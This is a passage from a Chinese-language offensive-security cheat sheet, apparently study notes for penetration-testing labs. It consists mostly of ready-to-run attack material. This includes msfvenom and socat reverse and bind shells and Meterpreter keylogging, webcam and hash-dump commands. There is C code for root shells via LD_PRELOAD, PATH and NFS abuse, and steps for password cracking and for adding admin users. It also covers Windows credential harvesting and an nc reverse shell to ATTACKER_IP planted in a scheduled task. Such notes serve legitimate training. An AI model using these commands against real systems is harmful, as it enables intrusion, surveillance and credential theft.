windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp &gt; rev_shell.asp</code></p><p>Python<br><code>msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw &gt; rev_shell.py</code></p><p><strong>Meterpreter</strong></p><p>获得会话后利用Meterpreter（具有一定免杀作用）进行后期利用</p><p>核心命令</p><ul><li><code>background</code>：当前会话的背景</li><li><code>exit</code>：终止Meterpreter会话</li><li><code>guid</code>：获取会话 GUID（全局唯一标识符）</li><li><code>help</code>：显示帮助菜单</li><li><code>info</code>：显示有关 Post 模块的信息</li><li><code>irb</code>：在当前会话中打开交互式 Ruby shell</li><li><code>load</code>：加载一个或多个Meterpreter扩展</li><li><code>migrate</code>：允许您将Meterpreter迁移到另一个进程</li><li><code>run</code>：执行Meterpreter脚本或 Post 模块</li><li><code>sessions</code>：快速切换到另一个会话</li></ul><p>文件系统命令</p><ul><li><code>cd</code>：将更改目录</li><li><code>ls</code>：将列出当前目录中的文件（dir 也可以）</li><li><code>pwd</code>：打印当前工作目录</li><li><code>edit</code>：将允许您编辑文件</li><li><code>cat</code>：将在屏幕上显示文件的内容</li><li><code>rm</code>：将删除指定文件</li><li><code>search</code>：将搜索文件</li><li><code>upload</code>：将上传文件或目录</li><li><code>download</code>：将下载文件或目录</li></ul><p>网络命令</p><ul><li><code>arp</code>：显示主机ARP（地址解析协议）缓存</li><li><code>ifconfig</code>：显示目标系统上可用的网络接口</li><li><code>netstat</code>：显示网络连接</li><li><code>portfwd</code>：将本地端口转发到远程服务</li><li><code>route</code>：允许您查看和修改路由表</li></ul><p>系统命令</p><ul><li><code>clearev</code>：清除事件日志</li><li><code>execute</code>：执行命令</li><li><code>getpid</code>：显示当前进程标识符</li><li><code>getuid</code>：向用户显示Meterpreter正在以以下身份运行</li><li><code>kill</code>：终止进程</li><li><code>pkill</code>：通过名称终止进程</li><li><code>ps</code>：列出正在运行的进程</li><li><code>reboot</code>：重新启动远程计算机</li><li><code>shell</code>：进入系统命令 shell</li><li><code>shutdown</code>：关闭远程计算机</li><li><code>sysinfo</code>：获取有关远程系统的信息，例如操作系统</li></ul><p>其他命令（这些命令将在帮助菜单中的不同菜单类别下列出）</p><ul><li><code>idletime</code>：返回远程用户空闲的秒数</li><li><code>keyscan_dump</code>：转储击键缓冲区</li><li><code>keyscan_start</code>：开始捕获击键</li><li><code>keyscan_stop</code>：停止捕获按键</li><li><code>screenshare</code>：允许您实时观看远程用户的桌面</li><li><code>screenshot</code>：抓取交互式桌面的屏幕截图</li><li><code>record_mic</code>：从默认麦克风录制 X 秒的音频</li><li><code>webcam_chat</code>：开始视频聊天</li><li><code>webcam_list</code>：列出网络摄像头</li><li><code>webcam_snap</code>：从指定的网络摄像头拍摄快照</li><li><code>webcam_stream</code>：播放指定网络摄像头的视频流</li><li><code>getsystem</code>：尝试将您的权限提升至本地系统权限</li><li><code>hashdump</code>：转储 SAM 数据库的内容</li></ul><h2 id="shell">Shell</h2><h3 id="工具：netcat-socat-metasploit-msfvenom">工具：Netcat、Socat、Metasploit、Msfvenom</h3><blockquote><p>Kali在<code>/usr/share/webshells</code>预装了一些webshell</p></blockquote><h3 id="种类：">种类：</h3><ul><li><strong>反向 shell</strong>：强制目标执行连接<em>回</em>您计算机的代码。使用上述工具之来设置用于接收连接的侦听器</li><li><strong>bind shell</strong>（少见）：在目标上执行的代码用于启动直接连接到目标上的 shell 的侦听器，可以连接到代码打开的端口，并以此方式获得远程代码执行。</li></ul><h3 id="稳定nc-shell："><strong>稳定nc shell</strong>：</h3><ul><li><p>一、Python（仅适用于Linux）：<code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code>，用 Python 生成功能更好的 bash shell；某些目标可能需要指定的 Python 版本，根据需要替换<code>python</code>为<code>python2</code>或<code>python3</code>。</p><p><code>export TERM=xterm</code>——这将使我们能够访问诸如术语命令<code>clear</code>。</p><p>使用 <code>Ctrl + Z </code>将 shell 置于后台。回到我们自己的终端，使用<code>stty raw -echo; fg</code>(能够访问制表符自动补全、箭头键和 Ctrl + C 来终止进程)。</p></li><li><p><strong>rlwrap</strong>：一个程序，在收到 shell 后让我们可以立即访问历史记录、Tab 自动完成和箭头键</p><p>要使用 rlwrap，我们需要调用一个稍微不同的监听器：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rlwrap nc -lvnp &lt;port&gt;</span><br></pre></td></tr></table></figure></li><li><p><strong>socat</strong>（交互式）：</p></li></ul><p>​反向shell</p><p>​监听：<code>socat TCP-L:&lt;port&gt; -</code></p><p>​Linux：<code>socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:&quot;bash -li&quot;</code></p><p>​Windows：<code>socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:powershell.exe,pipes</code></p><p>​bind shell</p><p>​攻击机：<code>socat TCP:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt; -</code></p><p>​Linux：<code>socat TCP-L:&lt;PORT&gt; EXEC:&quot;bash -li&quot;</code></p><p>​Windows：<code>socat TCP-L:&lt;PORT&gt; EXEC:powershell.exe,pipes</code></p><p>​完全稳定的Linux tty 反向 shell(仅限Linux)：</p><p>​监听：<code>socat TCP-L:&lt;port&gt; FILE:</code>tty<code>,raw,echo=0</code></p><p>​<code>socat TCP:&lt;attacker-ip&gt;:&lt;attacker-port&gt; EXEC:&quot;bash -li&quot;,pty,stderr,sigint,setsid,sane</code></p><blockquote><p>大多数机器默认没有安装 socat，可以上传<a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true">预编译的 socat 二进制文件</a></p></blockquote><p>​socat建立加密shell</p><p>​生成证书：<code>openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt</code></p><p>​合并为<code>.pem</code>文件：<code>cat shell.key shell.crt &gt; shell.pem</code></p><p>​反向shell监听器：<code>socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=0 -</code></p><p>​反向shell连接：<code>socat OPENSSL:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt;,verify=0 EXEC:/bin/bash</code></p><p>​bind shell 目标：<code>socat OPENSSL-LISTEN:&lt;PORT&gt;,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes</code></p><p>​攻击机：<code>socat OPENSSL:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt;,verify=0 -</code></p><p>​基于tty技术监听：<code>socat OPENSSL-LISTEN:&lt;port&gt;,cert=encrypt.pem,verify=0 FILE:</code>tty<code>,raw,echo=0</code></p><p>​连接：<code>socat OPENSSL:&lt;ip&gt;:&lt;port&gt;,verify=0 EXEC:&quot;bash -li&quot;,pty,stderr,sigint,setsid,sane</code></p><h3 id="shell-payload">shell payload</h3><p><a href="https://forum.ywhack.com/reverse-shell/">反弹shell生成器</a></p><p>[PayloadsAllTheThings](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology</a> and Resources/Reverse Shell <a href="http://Cheatsheet.md">Cheatsheet.md</a>)</p><p>msfvenom（仅会被Metasploit捕获）：<code>msfvenom -p &lt;PAYLOAD&gt; &lt;OPTIONS&gt;</code></p><h3 id="webshell">webshell</h3><p>指的是在网络服务器（通常使用PHP或 ASP等语言）内运行的脚本</p><blockquote><p>在 Windows 上，若获得以 SYSTEM 用户身份运行的 shell，或以高权限运行的管理员帐户，可以简单地将您自己的帐户（在管理员组中）添加到计算机，然后通过RDP、telnet、winexe、psexec、WinRM 或任何其他方法登录</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> user &lt;username&gt; &lt;password&gt; /add</span><br><span class="line"><span class="built_in">net</span> localgroup administrators &lt;username&gt; /add</span><br></pre></td></tr></table></figure></blockquote><h2 id="提权">提权</h2><h3 id="linux">Linux</h3><h4 id="信息打点">信息打点</h4><ul><li><p><code>hostname</code>返回目标机器的主机名（在某些情况下，它可以提供有关目标系统在公司网络中的角色的信息）</p></li><li><p><code>uname -a</code>将打印系统信息，为我们提供有关系统使用的内核的更多详细信息。这在搜索可能导致特权升级的任何潜在内核漏洞时非常有用。</p></li><li><p><code>/proc/version</code>提供有关内核版本的信息和其他数据，例如是否安装了编译器（例如 GCC）</p></li><li><p><code>/etc/issue</code>包含一些有关操作系统的信息</p></li><li><p><code>ps</code>显示当前 shell 的进程，<code>ps -A</code>查看所有正在运行的进程，<code>ps axjf</code>查看进程树、<code>ps aux</code>显示所有用户的进程（a）、显示启动进程的用户（u）以及显示未附加到终端的进程（x）</p></li><li><p><code>env</code>显示环境变量（可能有一个编译器或脚本语言（例如 Python），可用于在目标系统上运行代码或用于提升权限。）</p></li><li><p><code>sudo -l</code>目标系统可能配置为允许用户以 root 权限运行部分（或全部）命令。该可列出用户可以sudo运行的所有命令</p></li><li><p><code>ls -a</code>查看隐藏文件</p></li><li><p><code>id</code>提供用户权限级别和组成员资格的概述，可查看其他用户</p></li><li><p><code>/etc/passwd</code>轻松发现系统上的用户（返回所有用户，其中一些是系统或服务用户，用处不大。另一种方法是 grep “home”，因为真实用户的文件夹很可能位于“home”目录下。）</p></li><li><p><code>history</code>查看历史记录</p></li><li><p><code>ifconfig</code>目标系统可能是另一个网络的枢轴点。该<code>ifconfig</code> 命令将为我们提供有关系统网络接口的信息。</p></li><li><p><code>ip route</code>可以使用命令查看哪些网络路由存在来 确认这一点</p></li><li><p><code>netstat</code></p><p>​<code>netstat -a</code>：显示所有监听端口及已建立的连接。</p><p>​<code>netstat -at</code>或 <code>netstat -au</code>也可用于分别列出 TCP 或UDP协议。</p><p>​<code>netstat -l</code>：列出处于“监听”模式的端口。这些端口已打开并准备接受传入连接。这可以与“t”选项一起使用，以仅列出使用TCP协议监听的端口</p><p>​<code>netstat -s``-t</code> ：按协议列出网络使用情况统计信息（如下）这也可以与或选项一起使用<code>-u</code> 以将输出限制为特定协议</p><p>​<code>netstat -tp</code>：列出带有服务名称和PID 信息的连接。<code>-l</code> 也可以与列出监听端口的选项 一起使用</p><p>​<code>netstat -i</code>：显示接口统计信息</p><p>​<code>netstat</code> 最常看到的用法 可以<code>netstat -ano</code>显示所有sockets</p><ul><li><p><code>find</code></p><p><strong>查找文件：</strong></p><ul><li><code>find . -name flag1.txt</code>：在当前目录下查找名为“flag1.txt”的文件</li><li><code>find /home -name flag1.txt</code>：在/home目录中查找文件名为“flag1.txt”</li><li><code>find / -type d -name config</code>：在“/”下找到名为config的目录</li><li><code>find / -type f -perm 0777</code>：查找具有 777 权限的文件（所有用户可读、可写、可执行的文件）</li><li><code>find / -perm a=x</code>：查找可执行文件</li><li><code>find /home -user frank</code>：查找“/home”下用户“frank”的所有文件</li><li><code>find / -mtime 10</code>：查找过去 10 天内修改过的文件</li><li><code>find / -atime 10</code>：查找过去 10 天内访问过的文件</li><li><code>find / -cmin -60</code>：查找过去一小时（60 分钟）内更改的文件</li><li><code>find / -amin -60</code>：查找过去一小时（60 分钟）内访问的文件</li><li><code>find / -size 50M</code>：查找大小为 50 MB 的文件</li></ul><blockquote><p>此命令还可以与 (+) 和 (-) 符号一起使用来指定大于或小于给定大小的文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -size +100M</span><br></pre></td></tr></table></figure></blockquote></li></ul></li></ul><p><strong>find”命令往往会产生错误，这有时会使输出难以阅读。使用-type f 2&gt;/dev/null”将错误重定向到“/dev/null”并获得更清晰的输出</strong></p><ul><li><p>可以写入或执行的文件夹和文件：</p><ul><li><code>find / -writable -type d 2&gt;/dev/null</code>：查找可写的文件夹</li><li><code>find / -perm -222 -type d 2&gt;/dev/null</code>：查找可写的文件夹</li><li><code>find / -perm -o w -type d 2&gt;/dev/null</code>：查找可写的文件夹</li><li><code>find / -perm -o x -type d 2&gt;/dev/null</code> ：查找可执行文件夹</li></ul></li><li><p>查找开发工具和支持的语言：</p><ul><li><code>find / -name perl*</code></li><li><code>find / -name python*</code></li><li><code>find / -name gcc*</code></li></ul></li><li><p>查找具有 SUID 位的文件（suid提权）<br><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p></li></ul><blockquote><p>若在shell中只显示<code>$</code>可尝试<code>bash -i</code></p></blockquote><h4 id="自动枚举工具">自动枚举工具</h4><ul><li><strong>LinPeas</strong>：<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS</a></li><li>**LinEnum：**<a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></li><li>**LES（Linux漏洞利用建议器）：**<a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></li><li>**Linux智能枚举：**<a href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a></li><li><strong>Linux隐私检查器：</strong> <a href="https://github.com/linted/linuxprivchecker">https://github.com/linted/linuxprivchecker</a></li></ul><h4 id="内核提权">内核提权</h4><ol><li>识别内核版本</li><li>搜索并找到目标系统内核版本的漏洞代码</li><li>运行漏洞利用程序（内核漏洞利用失败可能会导致系统崩溃）</li></ol><blockquote><p><code>python -m http.server</code>利用python上传文件</p></blockquote><h4 id="sudo提权">sudo提权</h4><p><code>sudo -l</code>检查其当前与root权限相关的情况</p><p><strong>利用应用程序功能</strong>，如<code>Apache</code>、<code>Nmap</code></p><p><a href="https://gtfobins.github.io/%E6%8F%90%E4%BE%9B%E4%BA%86%E6%9C%89%E5%85%B3%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E6%8B%A5%E6%9C%89">https://gtfobins.github.io/提供了有关如何使用拥有</a> sudo 权限的任何程序的信息</p><p><strong>利用 LD_PRELOAD</strong></p><p>LD_PRELOAD 是一个允许任何程序使用共享库的函数。这篇<a href="https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/">博文</a>可了解 LD_PRELOAD 的功能。如果启用了“env_keep”选项，我们可以生成一个共享库，该库将在程序运行之前加载并执行。但如果实际用户 ID 与有效用户 ID 不同，则将忽略 LD_PRELOAD 选项。</p><ol><li>检查 LD_PRELOAD（使用 env_keep 选项）</li><li>编写一个简单的 C 代码，编译为共享对象（.so 扩展名）文件</li><li>使用 sudo 权限和指向我们的 .so 文件的 LD_PRELOAD 选项运行该程序</li></ol><blockquote><p>C 代码将简单地产生一个 root shell，可以按如下方式编写；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _init() &#123;</span><br><span class="line">unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">setgid(<span class="number">0</span>);</span><br><span class="line">setuid(<span class="number">0</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以将此代码保存为 shell.c，并使用 gcc 将其编译为共享目标文件，使用以下参数；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -o shell.so shell.c -nostartfiles</span><br></pre></td></tr></table></figure><p>现在，我们可以在启动用户可以使用 sudo 运行的任何程序时使用此共享对象文件。导致产生具有 root 权限的 shell</p></blockquote><h4 id="suid提权">suid提权</h4><p><code>find / -type f -perm -04000 -ls 2&gt;/dev/null</code>将列出设置了 SUID 或 SGID 位的文件。</p><p>示例：为<code>nano</code>设置的 SUID 位允许我们使用文件所有者的权限创建、编辑和读取文件，我们有两个基本的提权选项：读取文件<code>/etc/shadow</code>或将我们的用户添加到<code>/etc/passwd</code></p><p><code>nano /etc/shadow</code>将打印文件的内容<code>/etc/shadow</code>。现在我们可以使用 unshadow 工具创建一个可由John the Ripper破解的文件。为此，unshadow 需要<code>/etc/shadow</code>和<code>/etc/passwd</code>文件。</p><p>unshadow 工具的用法如下所示；<br><code>unshadow passwd.txt shadow.txt &gt; passwords.txt</code></p><p>有了正确的单词表和一点运气，John the Ripper可以以明文形式返回一个或多个密码。<code>john --wordlist=./pass.txt passwords.txt</code></p><p>另一个选项是添加具有 root 权限的新用户。这将帮助我们绕过繁琐的密码破解过程。以下是一个简单的方法：</p><p>我们需要新用户密码的哈希值。这可以使用 Kali Linux上的 openssl 工具快速完成。</p><p>然后我们将该密码和用户名添加到<code>/etc/passwd</code> 文件中。</p><p>一旦添加了我们的用户（请注意如何<code>root:/bin/bash</code>用于提供 root shell），我们将需要切换到该用户，并且希望它具有 root 权限。</p><h4 id="capabilities位提权">capabilities位提权</h4><p><code>getcap -r / 2&gt;/dev/null</code>来查看哪些具有<strong>capabilites</strong>权限</p><p>在GTFOBins查询提权方法即可</p><h4 id="计划任务提权">计划任务提权</h4><p>Cron 作业用于在特定时间运行脚本或二进制文件。作业配置存储为 crontabs（cron 表），以查看任务下次运行的时间和日期。系统上的每个用户都有自己的 crontab 文件，目标是找到一个由 root 设置的 cron 作业并让它运行我们的脚本，理想情况下是一个 shell。</p><p>任何用户都可以读取保存<strong>系统范围 cron 作业</strong>的文件，<code>/etc/crontab</code></p><blockquote><p>花时间了解脚本的功能以及任何工具在上下文中的使用方式总是值得的。例如，tar、7z、rsync 等，可以利用它们的通配符功能进行利用。</p></blockquote><h4 id="path提权">Path提权</h4><p>Linux 中的 PATH 是一个环境变量，若对其中一文件夹具有可写权限，可编译二进制文件并设置SUID位，由于设置了 SUID 位，此二进制文件将以 root 权限运行</p><p>1、可以使用“ ”命令对可写文件夹进行简单搜索<code>find / -writable 2&gt;/dev/null</code>。可以使用简单的剪切和排序序列清理此命令的输出。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -writable 2&gt;/dev/null | cut -d &quot;/&quot; -f 2 | sort -u</span><br></pre></td></tr></table></figure><p>2、将其与 PATH 进行比较将帮助我们找到可以使用的文件夹。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $PATH</span><br></pre></td></tr></table></figure><p>例如<code>/usr</code>比对成功，再比较子文件夹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -writable 2&gt;/dev/null | grep usr | cut -d &quot;/&quot; -f 2,3 | sort -u</span><br></pre></td></tr></table></figure><p>3、更容易写入的文件夹可能是 /tmp，将其加入<code>$PATH</code>：<code>export PATH=/tmp:$PATH</code></p><p>4、创建可执行文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; hack</span><br><span class="line">chmod 777 hack</span><br></pre></td></tr></table></figure><p>5、以 root 权限运行脚本，调用刚创立的可执行文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;hack&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc exp.c -o path -w</span><br><span class="line">chmod u+s path</span><br><span class="line">./path</span><br></pre></td></tr></table></figure><h4 id="nfs提权">NFS提权</h4><p>共享文件夹和远程管理接口（如SSH和 Telnet）也可以帮助您获得目标系统的 root 访问权限，例如，在目标系统上找到 root SSH私钥，然后使用 root 权限通过SSH进行连接，另一个途径是配置错误的网络 shell</p><p>NFS（网络文件共享）配置保存在<code>/etc/exports </code>文件中</p><p>提权的关键在于“no_root_squash”选项。默认情况下，NFS 会将 root 用户更改为 nfsnobody，并剥夺任何文件以 root 权限运行的权利。如果可写共享上存在“no_root_squash”选项，我们可以创建一个设置了 SUID 位的可执行文件并在目标系统上运行它。</p><p>1、在攻击机上枚举可挂载共享<code>showmount -e &lt;ip&gt;</code></p><p>2、把其中一个“no_root_squash”共享安装到我们的攻击机器上并开始构建我们的可执行文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmp/backupsonattackermachine</span><br><span class="line">sudo mount -o rw &lt;ip&gt;:/bacd /tmp/backupsonattackermachine</span><br></pre></td></tr></table></figure><p>3、由于我们可以设置 SUID 位，因此在目标系统上运行 /bin/bash 的简单可执行文件就可以</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc nfs.c -o nfs -w</span><br><span class="line">chmod +s nfs</span><br></pre></td></tr></table></figure><p>另一种方法</p><blockquote><p>攻击机</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="built_in">cp</span> /bin/bash .</span> </span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="built_in">chmod</span> +s bash</span> </span><br></pre></td></tr></table></figure><p>靶机</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="built_in">cd</span> &lt;SHAREDD_FOLDER&gt;</span> </span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">./bash -p <span class="comment">#ROOT shell</span></span></span><br></pre></td></tr></table></figure></blockquote><h3 id="windows">Windows</h3><p>提前了解Windows基础知识包括域控等和Metasploit</p><h4 id="信息打点">信息打点</h4><ul><li><strong>Unattended Windows Installations</strong></li></ul><p>​在大量主机上安装 Windows 时，管理员可以使用 Windows 部署服务，该服务允许通过网络将单个操作系统映像部署到多个主机。这些类型的安装称为无人值守安装，因为它们不需要用户交互。此类安装需要使用管理员帐户执行初始设置，最终可能会存储在计算机的以下位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Unattend.xml</span><br><span class="line">C:\Windows\Panther\Unattend.xml</span><br><span class="line">C:\Windows\Panther\Unattend\Unattend.xml</span><br><span class="line">C:\Windows\system32\sysprep.inf</span><br><span class="line">C:\Windows\system32\sysprep\sysprep.xml</span><br></pre></td></tr></table></figure><ul><li><strong>Powershell History</strong></li></ul><p>​每当用户使用 Powershell 运行命令时，它都会被存储到一个保存过去命令记忆的文件中。这对于快速重复以前使用过的命令非常有用。如果用户运行的命令直接在 Powershell 命令行中包含密码，则可以稍后使用提示符<code>cmd.exe</code>中的以下命令检索密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure><blockquote><p>上述命令只能在 cmd.exe 中运行，因为 Powershell 不会将其识别<code>%userprofile%</code>为环境变量。要从 Powershell 读取文件，您必须将其替换<code>%userprofile%</code>为<code>$Env:userprofile</code>。</p></blockquote><ul><li><strong>已保存的 Windows 凭据</strong></li></ul><p>​Windows 允许我们使用其他用户的凭据。此功能还提供了在系统上保存这些凭据的选项。以下命令将列出已保存的凭据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /list</span><br></pre></td></tr></table></figure><p>虽然您看不到实际的密码，但如果您注意到任何值得尝试的凭据，则可以将它们与命令 <code>runas</code> 和 <code>/savecred</code> 选项一起使用，如下所示。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas /savecred /user:admin cmd.exe</span><br></pre></td></tr></table></figure><ul><li><strong>IIS 配置</strong></li></ul><p>​Internet 信息服务 (IIS) 是 Windows 安装中的默认 Web 服务器。IIS 上的网站配置存储在名为<code>web.config</code>的文件中，可以存储数据库密码或配置的身份验证机制。根据安装的 IIS 版本，我们可以在以下位置之一找到 web.config：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\inetpub\wwwroot\web.config</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config</span><br></pre></td></tr></table></figure><p>以下是在文件上快速查找数据库连接字符串的一种方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString</span><br></pre></td></tr></table></figure><ul><li><strong>从软件中检索凭证</strong></li></ul><blockquote><p>例如：**PuTTY **， Windows 系统上常见的 SSH 客户端。用户无需每次都指定连接参数，而是可以存储会话，其中可以存储 IP、用户和其他配置以供日后使用。虽然 PuTTY 不允许用户存储他们的 SSH密码，但它会存储包含明文身份验证凭据的代理配置。</p><p>要检索存储的代理凭据，您可以使用以下命令在以下注册表项下搜索 ProxyPassword：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f &quot;Proxy&quot; /s</span><br></pre></td></tr></table></figure><p><strong>注意：</strong> Simon Tatham 是 PuTTY 的创建者（他的名字是路径的一部分），而不是我们要检索密码的用户名。运行上述命令后，存储的代理用户名也应该可见。</p><p>就像 putty 存储凭证一样，任何存储密码的软件，包括浏览器、电子邮件客户端、FTP 客户端、SSH客户端、VNC 软件等，都会有方法来恢复用户保存的任何密码。</p></blockquote><h4 id="计划任务">计划任务</h4><p>可以使用不带任何选项的<code>schtasks</code>命令从命令行列出计划任务  。要检索有关任何服务的详细信息，您可以使用以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /tn &lt;task name&gt; /fo list /v</span><br></pre></td></tr></table></figure><p>您将获得大量有关该任务的信息，但对我们来说重要的是“要运行的任务”参数，它指示计划任务执行的内容，以及“以用户身份运行”参数，它显示将用于执行该任务的用户。</p><p>如果我们当前的用户可以修改或覆盖“要运行的任务”可执行文件，我们就可以控制 taskusr1 用户执行的内容，从而实现简单的权限提升。要检查可执行文件的权限，我们使用<code>icacls</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls &lt;task_file_path&gt;</span><br></pre></td></tr></table></figure><p>若具有完全访问权限 (F)，修改权限 (M)这意味着我们可以修改 .bat 文件并插入任何我们想要的有效载荷。</p><p>利用<code>nc</code>修改bat文件生成反向 shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo .\nc64.exe -e cmd.exe ATTACKER_IP 4444 &gt; &lt;task_file_path&gt;</span><br></pre></td></tr></table></figure><h4 id="安装程序文件">安装程序文件</h4><p>Windows 安装程序文件（也称为 .msi 文件）用于在系统上安装应用程序。它们通常以启动它的用户的权限级别运行。但是，这些文件可以配置为从任何用户帐户（甚至是非特权帐户）以更高的权限运行。这可能允许我们生成以管理员权限运行的恶意 MSI 文件。</p><p>此方法需要设置两个注册表值。您可以使用以下命令从命令行查询这些值。</p><figure class="highlight 